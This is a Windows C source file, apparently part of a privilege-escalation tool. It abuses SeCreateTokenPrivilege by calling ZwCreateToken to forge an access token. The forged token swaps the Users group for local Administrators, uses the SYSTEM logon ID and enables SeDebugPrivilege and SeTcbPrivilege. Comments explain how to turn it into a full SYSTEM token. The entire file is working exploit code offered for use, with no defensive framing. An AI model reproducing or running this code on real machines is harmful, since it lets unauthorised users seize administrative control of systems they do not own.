#include "poptoke.h"

void get_system_privileges(PTOKEN_PRIVILEGES);

// Given a base, presumably non-priv'd token, generate a new one with the admin group added to it.
// This can very easily be adopted to generate a SYSTEM token instead (see commented out code).
HANDLE
se_create_token_privilege(HANDLE base_token, BOOL isPrimary)
{
	LUID luid;
	PLUID pluidAuth;
	NTSTATUS ntStatus;
	LARGE_INTEGER li;
	PLARGE_INTEGER pli;
	DWORD sessionId;
	_TOKEN_TYPE token_type = isPrimary ? TokenPrimary : TokenImpersonation;

	HANDLE elevated_token;
	PTOKEN_STATISTICS stats;
	PTOKEN_PRIVILEGES privileges;
	PTOKEN_OWNER owner;
	PTOKEN_PRIMARY_GROUP primary_group;
	PTOKEN_DEFAULT_DACL default_dacl;
	PTOKEN_GROUPS groups;
	SECURITY_QUALITY_OF_SERVICE sqos = { sizeof(sqos), SecurityImpersonation, SECURITY_STATIC_TRACKING, FALSE };
	OBJECT_ATTRIBUTES oa = { sizeof(oa), 0, 0, 0, 0, &sqos };
	SID_IDENTIFIER_AUTHORITY nt = SECURITY_NT_AUTHORITY;
	PSID_AND_ATTRIBUTES pSid;
	PISID pSidSingle;
	TOKEN_USER userToken;
	TOKEN_SOURCE sourceToken = { { '!', '!', '!', '!', '!', '!', '!', '!' }, { 0, 0 } };
	PSID lpSidOwner = NULL;
	LUID authid = SYSTEM_LUID;
	_ZwCreateToken ZwCreateToken;

	SID_BUILTIN TkSidLocalAdminGroup = { 1, 2, { 0, 0, 0, 0, 0, 5 }, { 32, DOMAIN_ALIAS_RID_ADMINS } };
	SID_INTEGRITY IntegritySIDHigh = { 1, 1, SECURITY_MANDATORY_LABEL_AUTHORITY, SECURITY_MANDATORY_HIGH_RID };
	SID_INTEGRITY IntegritySIDSystem = { 1, 1, SECURITY_MANDATORY_LABEL_AUTHORITY, SECURITY_MANDATORY_SYSTEM_RID };
	SID_INTEGRITY IntegritySIDMedium = { 1, 1, SECURITY_MANDATORY_LABEL_AUTHORITY, SECURITY_MANDATORY_MEDIUM_RID };

	ZwCreateToken = (_ZwCreateToken)GetProcAddress(LoadLibraryA("ntdll"), "ZwCreateToken");
	if (ZwCreateToken == NULL){
		printf("[-] Failed to load ZwCreateToken: %d\n", GetLastError());
		return NULL;
	}

	DWORD dwBufferSize = 0;
	PTOKEN_USER user;
	user = (PTOKEN_USER)GetInfoFromToken(base_token, TokenUser);

	AllocateAndInitializeSid(&nt, 1, SECURITY_LOCAL_SYSTEM_RID,
		0, 0, 0, 0, 0, 0, 0, &lpSidOwner);

	userToken.User.Sid = lpSidOwner;
	userToken.User.Attributes = 0;

	AllocateLocallyUniqueId(&luid);
	sourceToken.SourceIdentifier.LowPart = luid.LowPart;
	sourceToken.SourceIdentifier.HighPart = luid.HighPart;

	stats = (PTOKEN_STATISTICS)GetInfoFromToken(base_token, TokenStatistics);
	privileges = (PTOKEN_PRIVILEGES)LocalAlloc(LMEM_FIXED, sizeof(TOKEN_PRIVILEGES) + (sizeof(LUID_AND_ATTRIBUTES) * 2));
	get_system_privileges(privileges);
	groups = (PTOKEN_GROUPS)GetInfoFromToken(base_token, TokenGroups);
	primary_group = (PTOKEN_PRIMARY_GROUP)GetInfoFromToken(base_token, TokenPrimaryGroup);
	default_dacl = (PTOKEN_DEFAULT_DACL)GetInfoFromToken(base_token, TokenDefaultDacl);

	pSid = groups->Groups;
	for (int i = 0; i < groups->GroupCount; ++i, pSid++)
	{
		// change IL
		if (pSid->Attributes & SE_GROUP_INTEGRITY)
			memcpy(pSid->Sid, &IntegritySIDMedium, sizeof(IntegritySIDMedium));
		//memcpy(pSid->Sid, &IntegritySIDSystem, sizeof(IntegritySIDSystem));

		PISID piSid = (PISID)pSid->Sid;
		if (piSid->SubAuthority[piSid->SubAuthorityCount - 1] == DOMAIN_ALIAS_RID_USERS){
			// found RID_USERS membership, overwrite with RID_ADMINS
			memcpy(piSid, &TkSidLocalAdminGroup, sizeof(TkSidLocalAdminGroup));
			pSid->Attributes = SE_GROUP_ENABLED;
		}
		else {
			pSid->Attributes &= ~SE_GROUP_USE_FOR_DENY_ONLY;
			pSid->Attributes &= ~SE_GROUP_ENABLED;
		}
	}

	owner = (PTOKEN_OWNER)LocalAlloc(LPTR, sizeof(PSID));
	owner->Owner = user->User.Sid;
	//owner->Owner = GetLocalSystemSID();

	pluidAuth = &authid;
	li.LowPart = 0xFFFFFFFF;
	li.HighPart = 0xFFFFFFFF;
	pli = &li;
	ntStatus = ZwCreateToken(&elevated_token,
		TOKEN_ALL_ACCESS,
		&oa,
		token_type,
		pluidAuth,
		pli,
		user,
		//&userToken,
		groups,
		privileges,
		owner,
		primary_group,
		default_dacl,
		&sourceToken // creates an anonymous impersonation token
		);

	if (ntStatus == STATUS_SUCCESS)
		return elevated_token;
	else
		printf("[-] Failed to create new token: %d %08x\n", GetLastError(), ntStatus);

	FreeSid(lpSidOwner);
	if (stats) LocalFree(stats);
	if (groups) LocalFree(groups);
	if (privileges) LocalFree(privileges);
	return NULL;
}

void
get_system_privileges(PTOKEN_PRIVILEGES privileges)
{
	//TOKEN_PRIVILEGES privileges;
	LUID luid;

	privileges->PrivilegeCount = 2;

	// enable DEBUG
	printf("Finding SeDebugPrivilege name...\n");
	LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid);
	privileges->Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	privileges->Privileges[0].Luid = luid;

	// enable Tcb
	printf("Finding SeTcbPrivilege name...\n");
	LookupPrivilegeValue(NULL, SE_TCB_NAME, &luid);
	privileges->Privileges[1].Attributes = SE_PRIVILEGE_ENABLED;
	privileges->Privileges[1].Luid = luid;
}